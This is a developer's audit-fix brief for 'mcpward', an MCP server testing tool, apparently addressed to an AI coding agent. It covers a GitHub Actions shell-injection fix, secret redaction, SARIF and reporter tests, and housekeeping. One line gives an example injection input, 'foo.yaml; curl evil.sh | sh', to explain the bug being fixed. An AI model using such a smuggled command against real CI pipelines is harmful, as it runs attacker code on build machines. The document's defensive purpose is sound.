# mcpward — audit fixes (post-publish)

These findings come from an actual clone, build, and test run of `main` at v0.1.0. **Current state is good**: build and typecheck are clean, all 92 tests pass, exit codes are correct (`poisoned-server` → `1`), security heuristics catch all 8 planted attacks with zero false positives on `good-server`, timeouts work, HTTP transport is real, SARIF is valid 2.1.0. The items below are the gaps.

All existing rules in `CLAUDE.md` still apply: black-box only, no GUI, negative tests mandatory, `good-server` stays clean, report shapes and exit codes are a public contract.

**Before you start:** `pnpm install && pnpm run lint && pnpm run typecheck && pnpm run test && pnpm run build`. Confirm 92 tests pass and report the output. Work P0 → P1 → P2, stopping after each block to report.

---

## P0.1 — Shell injection in `action/action.yml` (security bug)

The composite action interpolates `${{ inputs.* }}` directly into a `run:` shell block:

```yaml
CMD="npx mcpward@${{ inputs.version }} run --config ${{ inputs.config }}"
```

This is GitHub Actions script injection: an input such as `foo.yaml; curl evil.sh | sh` executes. `$CMD` is also unquoted, so any path containing spaces breaks via word splitting. This is a vulnerability class we exist to catch in other people's setups — it must not be in our own action.

**Fix:** pass every input through `env:` and use a bash array, never string concatenation.

```yaml
    - name: Run mcpward
      id: run
      shell: bash
      working-directory: ${{ inputs.working-directory }}
      env:
        IN_CONFIG: ${{ inputs.config }}
        IN_VERSION: ${{ inputs.version }}
        IN_REPORTER: ${{ inputs.reporter }}
        IN_OUTPUT: ${{ inputs.output }}
        IN_LOCAL: ${{ inputs.local }}
      run: |
        set -uo pipefail
        args=(run --config "$IN_CONFIG")
        if [ "$IN_REPORTER" != "console" ]; then args+=(--reporter "$IN_REPORTER"); fi
        if [ -n "$IN_OUTPUT" ]; then
          args+=(--out "$IN_OUTPUT")
          printf 'report-path=%s\n' "$IN_OUTPUT" >> "$GITHUB_OUTPUT"
        fi
        if [ "$IN_LOCAL" = "true" ]; then
          node dist/cli.js "${args[@]}"
        else
          npx "mcpward@$IN_VERSION" "${args[@]}"
        fi
        EXIT_CODE=$?
        printf 'exit-code=%s\n' "$EXIT_CODE" >> "$GITHUB_OUTPUT"
        if [ "$EXIT_CODE" -eq 1 ]; then
          echo "::error::mcpward checks failed"; exit 1
        elif [ "$EXIT_CODE" -eq 2 ]; then
          echo "::error::mcpward configuration or connection error"; exit 2
        fi
```

Watch the exit-code capture: with `set -e` semantics an immediate non-zero from the command would abort before `EXIT_CODE` is read. Verify the capture actually works for exit codes 0, 1, and 2 — wrap the invocation so the code is captured reliably, and prove it (a scratch workflow or `act`, or at minimum a local bash simulation of all three paths). Report how you verified.

Also audit the rest of the repo for the same pattern: grep every workflow for `${{` appearing inside a `run:` block and convert those to `env:` too.

## P0.2 — Secret redaction: make the code match `SECURITY.md`

`SECURITY.md` declares secret leakage a valid vulnerability, but there is **no redaction logic anywhere in `src/`** (grep for `redact|sanitiz` returns nothing). `${ENV}` interpolation expands tokens into the config object and they live there in the clear.

Good news from the audit: `report.server` only carries `name`/`version`/`protocolVersion`, so tokens do not currently reach the JSON report. The problem is that nothing *guarantees* it, and error paths are unaudited.

Do this:

1. **Trace every path** a secret could take: `config.server.headers` values, `config.server.env`, interpolated URLs, transport connection errors (HTTP errors often embed the request URL), thrown exceptions, stack traces, and `--verbose` output. Report what you find as a list, including the paths that are already safe.
2. **Add redaction at the report-model boundary** (`src/report/model.ts`), not per reporter — so console, JSON, JUnit, and SARIF inherit it automatically. Redact known-sensitive config keys (`headers.*`, anything matching `token|secret|password|api[-_]?key|authorization`) and any string value that exactly matches an interpolated env value resolved during config load. Tracking the resolved values at interpolation time is the reliable approach: capture them in the config loader and pass the set through to the redactor.
3. **Add a test** (`test/report/redaction.test.ts`): build a config with `Authorization: "Bearer ${TEST_TOKEN}"`, set `TEST_TOKEN` to a distinctive value, run against `good-server`, render **all four** reporters, and assert the token string appears in none of them. Also assert it does not appear in a connection-failure error message (point at a dead URL).
4. If a leak path exists that you cannot close cleanly, say so explicitly rather than silently narrowing the claim — we will adjust `SECURITY.md` instead of pretending.

---

## P1.1 — Golden snapshot tests for all reporters (spec §9.4, currently missing entirely)

`junit`, `sarif`, and `console` have **no tests at all**. `CONTRIBUTING.md` declares report shapes a public contract, but nothing locks them, so any refactor can silently break a consumer's CI.

Add `test/report/golden.test.ts`:

- Build a **fixed, hand-constructed `CheckReport` object** in the test (not one produced by connecting to a server). Real runs include timings and versions that vary between machines, which makes snapshots flaky. Include at least one result per family and per status (`pass`/`fail`/`warn`), with `expected`/`actual`/`location` populated.
- Snapshot `renderJsonReport`, `renderJunitReport`, `renderSarifReport`, and `renderConsoleReport` (console with colors disabled, and separately with `verbose: true`).
- Any field that is inherently variable (durations, timestamps, tool version) must be stubbed or normalized before snapshotting — otherwise the suite fails on every run and gets ignored, which is worse than no test.
- Additionally assert **structurally** (not just by snapshot) that JUnit XML is well-formed and parses, and that SARIF validates against the 2.1.0 schema. Snapshots catch drift; structural assertions catch invalidity.

## P1.2 — Fix all 17 broken SARIF `helpUri` anchors

Every rule points at an anchor that does not exist. Verified: the generated `helpUri`s are `#compliancehandshake`, `#schematool-name`, `#errorsinvalid-params`, etc., derived by stripping non-alphanumerics from the rule id — but `README.md` contains headings like `### Compliance` and `### Schema`, so **all 17 anchors 404**. Every GitHub code-scanning alert currently links to nowhere.

Fix by creating `docs/rules.md` with one section per rule id (`## compliance/handshake`, `## security/injection-pattern`, …) and pointing `helpUri` at that file's anchors. Do not hand-maintain the mapping: derive the anchor from the rule id with a single shared function used by both the doc generator and the SARIF reporter, and **add a test that asserts every emitted `helpUri` anchor resolves to a heading that exists in `docs/rules.md`**. That test is what keeps this from silently rotting again.

## P1.3 — SARIF rule metadata: `help` and `defaultConfiguration`

Rules currently carry only `shortDescription`, `fullDescription`, `helpUri`, `properties`. GitHub code scanning renders a nearly empty alert page without `help`.

For each rule add:
- `help.text` and `help.markdown` — what the finding means, why it matters, and how to fix it. For security rules this is the part that makes the tool feel authoritative, so write it properly rather than repeating the short description.
- `defaultConfiguration.level` (`error` / `warning` / `note`) matching the severity the check emits.
- Distinct `shortDescription` and `fullDescription` — they are currently identical strings, which looks auto-generated.

## P1.4 — SARIF locations have no `region`

All findings point at `mcpward.yaml` with no line information, so every alert stacks on one file with no context. Where the finding originates from a config-declared item (a tool in a suite, a `fail_on` entry), resolve the actual line in the YAML and emit a `region`. Where the finding is about a remote server's tool and has no config line, keep the `logicalLocations` entry (that part is already correct) and point `physicalLocation` at the config file — but be consistent and document the choice in `docs/rules.md`.

## P1.5 — Missing dedicated `compliance` test file

Every other check family has one; compliance is only covered incidentally through integration tests. Add `test/checks/compliance.test.ts` with a negative test per compliance rule, using `malformed-server` (extend the fixture if a rule has no way to fail today — a rule that cannot go red is a bug per our own contributing guide).

---

## P2 — Housekeeping

- Move `PULL_REQUEST_TEMPLATE.md` to `.github/PULL_REQUEST_TEMPLATE.md`.
- Commit `CLAUDE.md` and the spec as `docs/SPEC.md`; reference both from `CONTRIBUTING.md`.
- Add a `docs/demo.gif` placeholder reference near the top of the README, directly under the badges. I will record the actual demo — reserve the slot with alt text.
- Make the README badges clickable links to npm and add `npm/dm` (downloads) and `node/v` badges.
- The test suite takes ~74s, mostly from spawning a server per test (latency tests alone are ~26s). Not urgent, but if it grows, look at sharing a server instance across tests within a file rather than per test. Do not sacrifice isolation between *fixtures* to do it.

---

## Reporting

After each block, give me:
1. Changed files and what changed in each.
2. Real command output for anything verified — especially the P0.1 exit-code paths and the P0.2 leak test.
3. Anything you found that is wrong but not listed here. I specifically want your own read on P0.2: whether a secret can reach output through a path I did not enumerate.
4. Anything ambiguous — ask instead of guessing.
